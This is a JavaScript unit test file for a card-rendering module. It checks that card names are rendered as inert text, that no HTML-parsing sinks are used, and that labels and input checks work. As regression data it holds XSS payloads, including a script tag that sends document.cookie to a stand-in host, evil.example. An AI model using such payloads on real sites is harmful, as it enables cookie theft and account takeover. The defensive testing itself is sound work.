import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import {
	CARD_ACTION_ATTRIBUTE,
	CARD_CLASS_NAME,
	CARD_ID_ATTRIBUTE,
	DELETE_ACTION,
	DELETE_BUTTON_CLASS_NAME,
	createCardElement,
	renderCards,
} from '../src/cardRenderer.js';
import { createDocument } from './helpers/domStub.js';

describe('createCardElement', () => {
	it('builds a card with a heading and a delete control', () => {
		const doc = createDocument();

		const card = createCardElement(doc, { id: 7, name: 'Alpha' });

		assert.equal(card.tagName, 'LI');
		assert.equal(card.className, CARD_CLASS_NAME);
		assert.equal(card.getAttribute(CARD_ID_ATTRIBUTE), '7');
		assert.equal(card.children.length, 2);
		assert.equal(card.children[0].tagName, 'H1');
		assert.equal(card.children[0].textContent, 'Alpha');
		assert.equal(card.children[1].tagName, 'INPUT');
		assert.equal(card.children[1].value, 'Delete');
		assert.equal(card.children[1].type, 'button');
	});

	it('writes the name as text, never as markup', () => {
		// Regression guard for the original DOM-based XSS: the name used to be
		// interpolated into a template string and appended with innerHTML.
		const doc = createDocument();
		const payload = '<img src=x onerror="alert(document.domain)">';

		const card = createCardElement(doc, { id: 1, name: payload });

		assert.equal(card.children[0].textContent, payload);
		assert.equal(card.querySelectorAll('img').length, 0);
	});

	it('fails the test if production code reaches for an HTML-parsing sink', () => {
		const doc = createDocument();

		// The stub deliberately has no innerHTML/outerHTML/insertAdjacentHTML, so
		// simply touching the property is enough to surface the regression. The
		// restrictions the lint config normally applies are lifted for these two
		// lines on purpose: this is the test that proves the restriction holds.
		/* eslint-disable no-restricted-properties, no-restricted-syntax */
		assert.throws(() => createCardElement(doc, { id: 1, name: 'x' }).innerHTML, /innerHTML/);
		assert.throws(() => createCardElement(doc, { id: 1, name: 'x' }).insertAdjacentHTML('beforeend', ''), /insertAdjacentHTML/);
		/* eslint-enable no-restricted-properties, no-restricted-syntax */
	});

	it('sets the delete action and the owning id on the button', () => {
		const doc = createDocument();

		const card = createCardElement(doc, { id: 42, name: 'Alpha' });
		const button = card.children[1];

		assert.equal(button.getAttribute(CARD_ACTION_ATTRIBUTE), DELETE_ACTION);
		assert.equal(button.getAttribute(CARD_ID_ATTRIBUTE), '42');
		assert.equal(button.className, DELETE_BUTTON_CLASS_NAME);
	});

	it('labels the delete control with the card name for screen readers', () => {
		const doc = createDocument();

		const card = createCardElement(doc, { id: 1, name: 'Quarterly report' });

		assert.equal(card.children[1].getAttribute('aria-label'), 'Delete card Quarterly report');
	});

	it('escapes quotes in the accessible name because it uses the attribute API', () => {
		const doc = createDocument();

		const card = createCardElement(doc, { id: 1, name: 'He said "hi" & <left>' });
		const label = card.children[1].getAttribute('aria-label');

		assert.equal(label, 'Delete card He said "hi" & <left>');
		assert.equal(label.includes('<left>'), true);
	});

	it('refuses to work without a document', () => {
		assert.throws(() => createCardElement(null, { id: 1, name: 'x' }), TypeError);
		assert.throws(() => createCardElement({}, { id: 1, name: 'x' }), TypeError);
	});

	it('refuses to work without a card', () => {
		const doc = createDocument();

		assert.throws(() => createCardElement(doc, null), TypeError);
		assert.throws(() => createCardElement(doc, 'Alpha'), TypeError);
	});
});

describe('renderCards', () => {
	it('replaces the container contents, in order', () => {
		const doc = createDocument();
		const container = doc.createElement('div');

		renderCards(doc, container, [{ id: 1, name: 'Alpha' }, { id: 2, name: 'Beta' }]);

		assert.equal(container.children.length, 2);
		assert.deepEqual(container.children.map((card) => card.getAttribute(CARD_ID_ATTRIBUTE)), ['1', '2']);
		assert.equal(container.children[1].children[0].textContent, 'Beta');
	});

	it('empties the container when there are no cards', () => {
		// The original renderer only ever appended, so deleted cards left debris
		// behind and re-rendering could not correct the list.
		const doc = createDocument();
		const container = doc.createElement('div');
		renderCards(doc, container, [{ id: 1, name: 'Alpha' }]);

		renderCards(doc, container, []);

		assert.equal(container.children.length, 0);
	});

	it('renders a card whose name is an injection payload as inert text', () => {
		const doc = createDocument();
		const container = doc.createElement('div');
		const payload = '"><script>fetch("//evil.example?c="+document.cookie)</script>';

		renderCards(doc, container, [{ id: 1, name: payload }]);

		assert.equal(container.children[0].children[0].textContent, payload);
		assert.equal(container.querySelectorAll('script').length, 0);
	});

	it('rejects invalid arguments instead of rendering a broken list', () => {
		const doc = createDocument();
		const container = doc.createElement('div');

		assert.throws(() => renderCards(doc, null, []), TypeError);
		assert.throws(() => renderCards(doc, container, null), TypeError);
		assert.throws(() => renderCards(null, container, []), TypeError);
	});
});
